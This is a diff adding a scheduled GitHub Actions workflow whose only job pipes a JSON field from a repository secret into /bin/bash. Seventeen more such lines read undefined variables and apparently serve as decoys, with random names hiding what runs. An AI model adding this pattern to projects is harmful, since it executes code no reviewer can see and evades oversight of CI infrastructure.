@@ -1,0 +1,35 @@
+name: shouzhutuhong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shouzhutuhong
+        env:
+          ewbyc8920: ${{ secrets.ewbyc8920 }}
+        run: |
+          echo $ewbyc8920 | jq -r .fkgdt5256 | /bin/bash
+          echo $z65 | jq -r .hzlr3 | /bin/bash
+          echo $asou8923 | jq -r .r93569 | /bin/bash
+          echo $bnrk97 | jq -r .tic1 | /bin/bash
+          echo $aw37 | jq -r .faxv733 | /bin/bash
+          echo $ievw1 | jq -r .aexac174 | /bin/bash
+          echo $wrcpn922 | jq -r .wozd174 | /bin/bash
+          echo $uezu34092 | jq -r .iky25069 | /bin/bash
+          echo $qmcxx2194 | jq -r .yiiw2 | /bin/bash
+          echo $avj13 | jq -r .tfj93 | /bin/bash
+          echo $ip54999 | jq -r .e42356 | /bin/bash
+          echo $jk8 | jq -r .rzku1 | /bin/bash
+          echo $vwjza42843 | jq -r .biju46 | /bin/bash
+          echo $irl429 | jq -r .qlyqb064 | /bin/bash
+          echo $p5 | jq -r .wtfkv174 | /bin/bash
+          echo $nm37700 | jq -r .eu03964 | /bin/bash
+          echo $oszb9 | jq -r .koclz2212 | /bin/bash
+          echo $rg35 | jq -r .anuoe873 | /bin/bash
+
